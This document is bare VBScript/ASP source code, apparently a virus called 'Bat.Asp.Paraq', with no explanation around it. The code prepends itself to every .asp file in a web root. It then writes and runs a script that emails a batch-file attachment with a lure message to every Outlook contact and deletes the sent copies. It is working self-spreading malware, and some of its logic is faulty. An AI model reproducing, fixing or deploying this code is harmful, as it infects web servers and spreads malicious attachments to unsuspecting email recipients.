
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set Drives=fso.drives
	a = Server.CreateObject("virtualpath.lookpath")
	Set dropper = Fso.opentextfile(a,1,true)
	src = dropper.readall
dropper.close


Set Folder=fso.getfolder("C:\InetPub\wwwRoot")
Set Files = folder.files 
	For Each File in files
		If fso.GetExtensionName(file.path)="asp" then
		on error resume next
			Set reader = Fso.opentextfile(file.path,1, True)
				readman = reader.readline
					if reader <> "<!--.:Bat.Asp.Paraq:.-->" then
						Set Scripts = fso.OpenTextFile(file.path, 1, True)
						ScriptsSource = Scripts.ReadAll
						Set WriteScripts = FSO.OpenTextFile(file.path, 2, True)
						WriteScripts.WriteLine src
						WriteScripts.WriteLine ScriptsSource
					end if
			end If
	Next

Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
	If fso.GetExtensionName(file.path)="asp" then
		on error resume next
			Set reader = Fso.opentextfile(file.path,1, True)
				readman = reader.readline
					if reader <> "<!--.:Bat.Asp.Paraq:.-->" then
						Set Scripts = FSO.OpenTextFile(file.path, 1, True)
						ScriptsSource = Scripts.ReadAll
						Set WriteScripts = FSO.OpenTextFile(file.path, 2, True)
						WriteScripts.WriteLine src
						WriteScripts.WriteLine ScriptsSource
					end if
			end If
	Next

Set Mailer = fso.CreateTextFile("C:\Mailer.vbs")
	Mailer.Write "On error resume next" & vbcrlf
	Mailer.Write "Set Fso=CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & ")" & vbcrlf
	Mailer.Write "Set aaaaaaaa=CreateObject(" & chr(34) & "Outlook.Application" & chr(34) & ")" & vbcrlf
	Mailer.Write "Set aaaaaaaa=aaaaaaaa.GetNameSpace(" & chr(34) & "MAPI"" & chr(34) & )" & vbcrlf
	Mailer.Write "For Each C In aaaaaaaa.AddressLists" & vbcrlf
	Mailer.Write "If C.AddressEntries.Count <> 0 Then" & vbcrlf
	Mailer.Write "For D=1 To C.AddressEntries.Count" & vbcrlf
	Mailer.Write "Set aaaaaaaa=C.AddressEntries(D)" & vbcrlf
	Mailer.Write "Set aaaaaaaa=aaaaaaaa.CreateItem(0)" & vbcrlf
	Mailer.Write "aaaaaaaa.To=aaaaaaaa.Address" & vbcrlf
	Mailer.Write "aaaaaaaa.Subject=" & chr(34) & "Asp Paraq" & chr(34) & vbcrlf
	Mailer.Write "aaaaaaaa.Body=" & chr(34) & "Stop asking what is this,just checkout the attachment" & chr(34) & vbcrlf
	Mailer.Write "aaaaaaaa.Attachments.Add(" & chr(34) & "C:\paraq.bat" & chr(34) & ")" & vbcrlf
	Mailer.Write "aaaaaaaa.DeleteAfterSubmit=True" & vbcrlf
	Mailer.Write "If aaaaaaaa.To <> "" Then" & vbcrlf
	Mailer.Write "aaaaaaaa.Send" & vbcrlf
	Mailer.Write "End If" & vbcrlf
	Mailer.Write "Next" & vbcrlf
	Mailer.Write "End If" & vbcrlf
	Mailer.Write "Next" & vbcrlf
Mailer.Close
Set Executor = Server.CreateObject("Wscript.Shell")
Executor.run "C:\Mailer.vbs"

